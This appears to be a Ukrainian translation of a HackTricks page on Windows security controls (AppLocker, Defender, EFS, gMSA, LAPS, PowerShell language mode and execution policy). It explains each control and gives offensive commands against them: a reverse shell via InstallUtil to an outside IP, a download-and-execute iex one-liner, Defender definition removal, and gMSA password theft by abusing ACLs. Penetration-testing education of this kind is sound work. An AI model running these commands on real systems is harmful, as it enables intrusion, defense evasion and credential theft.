# Засоби безпеки Windows

{{#include ../../banners/hacktricks-training.md}}

## Політика AppLocker

Білий список застосунків — це перелік схвалених програм або виконуваних файлів, які дозволено зберігати в системі та запускати. Його мета — захистити середовище від шкідливого malware та несхваленого програмного забезпечення, що не відповідає конкретним потребам організації.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) — це **рішення Microsoft для білого списку застосунків**, яке дає системним адміністраторам змогу контролювати, **які застосунки та файли можуть запускати користувачі**. Воно забезпечує **детальний контроль** над виконуваними файлами, скриптами, інсталяційними файлами Windows, DLL, пакетованими застосунками та інсталяторами пакетованих застосунків.\
Організації часто **блокують cmd.exe і PowerShell.exe**, а також забороняють запис до певних каталогів, **але все це можна обійти**.

### Перевірка

Перевірте, які файли/розширення внесено до чорного/білого списку:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Цей шлях реєстру містить конфігурації та політики, застосовані AppLocker, і дає змогу переглянути поточний набір правил, що діють у системі:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Корисні **доступні для запису папки** для обходу політики AppLocker: якщо AppLocker дозволяє виконувати будь-що в `C:\Windows\System32` або `C:\Windows`, є **доступні для запису папки**, які можна використати для **обходу цього обмеження**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Загальновідомі **довірені** бінарні файли [**"LOLBAS's"**](https://lolbas-project.github.io/) також можуть бути корисними для обходу AppLocker.
- **Погано написані правила теж можна обійти**
  - Наприклад, для **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** можна будь-де створити **папку з назвою `allowed`**, і вона буде дозволена.
  - Організації також часто зосереджуються на **блокуванні виконуваного файла `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, але забувають про **інші** [**розташування виконуваних файлів PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), як-от `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` або `PowerShell_ISE.exe`.
- **Примусове застосування правил для DLL вмикають украй рідко** через додаткове навантаження на систему та обсяг тестування, потрібного, щоб переконатися, що нічого не зламається. Тож використання **DLL як бекдорів допоможе обійти AppLocker**.
- Ви можете скористатися [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати** код Powershell у будь-якому процесі й обходити AppLocker. Докладніше дивіться тут: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Зберігання облікових даних

### Диспетчер облікових записів безпеки (SAM)

Локальні облікові дані зберігаються в цьому файлі, паролі хешовані.

### Локальна служба безпеки (LSA) — LSASS

**Облікові дані** (хешовані) **зберігаються** в **пам'яті** цієї підсистеми для підтримки єдиного входу (Single Sign-On).\
**LSA** керує локальною **політикою безпеки** (політикою паролів, дозволами користувачів...), **автентифікацією**, **токенами доступу**...\
Саме LSA **перевіряє** надані облікові дані у файлі **SAM** (для локального входу) та **взаємодіє** з **контролером домену**, щоб автентифікувати користувача домену.

**Облікові дані** зберігаються в **процесі LSASS**: квитки Kerberos, хеші NT і LM, паролі, які легко розшифрувати.

### Секрети LSA

LSA може зберігати деякі облікові дані на диску:

- Пароль облікового запису комп'ютера в Active Directory (недоступний контролер домену).
- Паролі облікових записів служб Windows
- Паролі для запланованих завдань
- Інше (пароль програм IIS...)

### NTDS.dit

Це база даних Active Directory. Вона є лише на контролерах домену.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) — це антивірус, доступний у Windows 10 і Windows 11, а також у версіях Windows Server. Він **блокує** поширені інструменти pentesting, як-от **`WinPEAS`**. Однак є способи **обійти ці засоби захисту**.

### Перевірка

Щоб перевірити **стан** **Defender**, можна виконати командлет PS **`Get-MpComputerStatus`** (перевірте значення **`RealTimeProtectionEnabled`**, щоб дізнатися, чи він активний):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Щоб також зібрати інформацію про нього, можна виконати:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS захищає файли за допомогою шифрування, використовуючи **симетричний ключ**, відомий як **ключ шифрування файлу (FEK)**. Цей ключ шифрується **відкритим ключем** користувача та зберігається в **альтернативному потоці даних** $EFS зашифрованого файлу. Для розшифрування FEK із потоку $EFS використовується відповідний **закритий ключ** цифрового сертифіката користувача. Докладніше можна дізнатися [тут](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Сценарії розшифрування без участі користувача**:

- Під час переміщення файлів або папок до файлової системи без підтримки EFS, як-от [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), вони автоматично розшифровуються.
- Зашифровані файли, надіслані мережею через протокол SMB/CIFS, розшифровуються перед передаванням.

Цей метод шифрування забезпечує власнику **прозорий доступ** до зашифрованих файлів. Однак проста зміна пароля власника та вхід у систему не дасть змоги розшифрувати файли.

**Основні висновки**:

- EFS використовує симетричний FEK, зашифрований відкритим ключем користувача.
- Для розшифрування FEK використовується закритий ключ користувача.
- Автоматичне розшифрування відбувається за певних умов, наприклад під час копіювання до FAT32 або передавання мережею.
- Власник може отримати доступ до зашифрованих файлів без додаткових дій.

### Перевірка інформації про EFS

Перевірте, чи **користувач** **користувався** цією **службою**, з’ясувавши, чи існує цей шлях:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Перевірте, **хто** має **доступ** до файлу за допомогою cipher /c \<file>\
Також можна використовувати `cipher /e` та `cipher /d` у папці, щоб **зашифрувати** або **розшифрувати** всі файли

### Розшифрування файлів EFS

#### Робота від імені Authority System

Для цього способу потрібно, щоб **процес** **працював** на хості від імені **користувача-жертви**. Якщо це так, за допомогою сесії `meterpreter` можна видати себе за користувача, імперсонувавши токен його процесу (`impersonate_token` з `incognito`). Або можна просто виконати `migrate` до процесу користувача.

#### Знаючи пароль користувача

У документації Mimikatz описано, як імпортувати матеріали сертифіката/закритого ключа користувача та розшифрувати файли, захищені EFS, якщо відомий пароль.<sup>[[6]](#references)</sup>

## Облікові записи служб, керовані групами (gMSA)

Microsoft розробила **облікові записи служб, керовані групами (gMSA)**, щоб спростити керування обліковими записами служб в ІТ-інфраструктурах. На відміну від традиційних облікових записів служб, для яких часто ввімкнено параметр "**Password never expire**", gMSA пропонують безпечніше та зручніше рішення:

- **Автоматичне керування паролями**: gMSA використовують складний пароль із 240 символів, який автоматично змінюється відповідно до політики домену або комп’ютера. Цим процесом керує Key Distribution Service (KDC) від Microsoft, тож паролі не потрібно оновлювати вручну.
- **Підвищена безпека**: ці облікові записи не блокуються та не можуть використовуватися для інтерактивного входу, що підвищує їхню безпеку.
- **Підтримка кількох хостів**: gMSA можна використовувати на кількох хостах, тож вони підходять для служб, що працюють на кількох серверах.
- **Підтримка запланованих завдань**: на відміну від керованих облікових записів служб, gMSA можна використовувати для виконання запланованих завдань.
- **Спрощене керування SPN**: система автоматично оновлює Service Principal Name (SPN), коли змінюються дані sAMaccount комп’ютера або його DNS-ім’я, що спрощує керування SPN.

Паролі gMSA зберігаються у властивості LDAP _**msDS-ManagedPassword**_ і автоматично скидаються контролерами домену (DC) кожні 30 днів. Цей пароль, зашифрований блок даних, відомий як [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), можуть отримати лише авторизовані адміністратори та сервери, на яких встановлено gMSA, що забезпечує безпечне середовище. Для доступу до цієї інформації потрібне захищене з’єднання, наприклад LDAPS, або автентифікація з використанням 'Sealing & Secure'.

![Переспрямування автентифікації NTLM для отримання пароля gMSA](../../images/asd1.png)<sup>[[1]](#references)</sup>

Цей пароль можна прочитати за допомогою [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Знайдіть більше інформації в архівному оригінальному дослідженні**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

У тому самому дослідженні пояснюється, як **NTLM relay attack** може отримати **пароль gMSA**, якщо ретрансльований принципал має право читати `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Зловживання ланцюжком ACL для читання керованого пароля gMSA (GenericAll -> ReadGMSAPassword)

У багатьох середовищах користувачі з низькими привілеями можуть отримати доступ до секретів gMSA без компрометації DC, скориставшись неправильно налаштованими ACL об’єктів:<sup>[[3]](#references)</sup>

- Групі, яку ви можете контролювати (наприклад, через GenericAll/GenericWrite), надано `ReadGMSAPassword` для gMSA.
- Додавши себе до цієї групи, ви отримаєте право читати blob `msDS-ManagedPassword` gMSA через LDAP і отримати придатні для використання облікові дані NTLM.

Типовий процес:

1) Знайдіть шлях за допомогою BloodHound і позначте свої початкові принципали доступу як Owned. Шукайте зв’язки на кшталт:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Додайте себе до проміжної групи, яку ви контролюєте (приклад із bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Зчитати керований пароль gMSA через LDAP і обчислити NTLM-хеш. NetExec автоматизує вилучення `msDS-ManagedPassword` і перетворення на NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Автентифікуйтеся як gMSA за допомогою NTLM-хешу (пароль у відкритому вигляді не потрібен). Якщо обліковий запис входить до групи Remote Management Users, WinRM працюватиме напряму:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Примітки:
- Для LDAP-читання `msDS-ManagedPassword` потрібне шифрування (наприклад, LDAPS/sign+seal). Інструменти роблять це автоматично.
- gMSA часто надають локальні права, як-от WinRM; перевірте членство в групах (наприклад, Remote Management Users), щоб спланувати lateral movement.
- Якщо вам потрібен лише blob, щоб самостійно обчислити NTLM, див. структуру MSDS-MANAGEDPASSWORD_BLOB.

Ще один шлях через ACL — надання права запису безпосередньо на об’єкт gMSA. `msDS-GroupMSAMembership` — це дескриптор безпеки, який визначає, яким принципалам дозволено отримувати керований пароль. GUID цієї схеми — `888eedd6-ce04-df40-b462-b8a50e41ba38`. Точний ACE `WriteProperty` для цього атрибута, наданий групі, яку ви контролюєте, може дозволити змінити список читачів; це не те саме, що вже бути вказаним у списку читачів. Перш ніж вважати цей шлях придатним для використання, перевірте повний DACL, заборонні та успадковані ACE, а також ефективні дозволи. Перш ніж намагатися прочитати пароль, після додавання до групи потрібно оновити токен/сеанс.<sup>[[7]](#references)</sup>



## LAPS

**Local Administrator Password Solution (LAPS)**, доступний для завантаження з [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), дає змогу керувати паролями локального Administrator. Ці паролі **випадкові**, унікальні та **регулярно змінюються**; вони зберігаються централізовано в Active Directory. Доступ до цих паролів обмежено за допомогою ACL і надано лише авторизованим користувачам. За наявності достатніх дозволів можна читати паролі локального адміністратора.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **обмежує багато функцій**, потрібних для ефективного використання PowerShell, зокрема блокує COM-об’єкти, дозволяє лише затверджені типи .NET, робочі процеси на основі XAML, класи PowerShell тощо.

### **Перевірка**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

У поточних версіях Windows цей bypass більше не працює, але можна скористатися [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Щоб скомпілювати його, може знадобитися** **вибрати** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> додати `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` і **змінити проєкт на .Net4.5**.

#### Прямий bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати код Powershell** у будь-якому процесі й обходити constrained mode. Докладніше дивіться: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Політика виконання PS

За замовчуванням встановлено значення **restricted.** Основні способи обійти цю політику:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Більше можна знайти [тут](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Інтерфейс постачальника служб безпеки (SSPI)

Це API, який можна використовувати для автентифікації користувачів.

SSPI вибирає відповідний протокол автентифікації для двох машин, що обмінюються даними, надаючи перевагу Kerberos, якщо він доступний. Ці протоколи реалізовані постачальниками служб безпеки (SSP), які встановлюються у Windows як DLL; обидва вузли мають підтримувати узгоджений постачальник.

### Основні SSP

- **Kerberos**: бажаний протокол
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** і **NTLMv2**: для сумісності
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: вебсервери та LDAP; пароль у вигляді MD5-хешу
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL і TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: використовується для узгодження протоколу (Kerberos або NTLM; за замовчуванням — Kerberos)
  - %windir%\Windows\System32\lsasrv.dll

#### Під час узгодження можна запропонувати кілька методів або лише один.

## UAC — контроль облікових записів користувачів

[Контроль облікових записів користувачів (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка виводить **запит на підтвердження для дій із підвищеними привілеями**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Ретрансляція для gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA через ланцюжок прав для WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Обхід AppLocker і обмеженого мовного режиму PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 способів обійти політику виконання PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ розшифрування файлів EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft — атрибут ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
